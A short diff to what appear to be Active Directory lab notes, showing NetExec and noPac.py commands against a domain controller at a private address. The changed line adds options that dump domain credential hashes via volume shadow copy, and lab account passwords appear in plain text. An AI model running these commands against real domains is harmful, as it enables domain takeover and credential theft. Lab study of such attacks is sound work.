@@ -5,7 +5,7 @@
 ```
 nxc smb 192.168.0.239 -u nopac -p 'P@ssw0rd_OxsiuM_2026!' -M nopac
 
-python3 noPac.py warzone.oxsium.local/Administrator:'sako2005!' -dc-ip 192.168.0.239 -use-ldap
+python3 noPac.py warzone.oxsium.local/Administrator:'sako2005!' -dc-ip 192.168.0.239 -use-ldap -dump -use-vss
 ```
 
 ### Ldap Environment
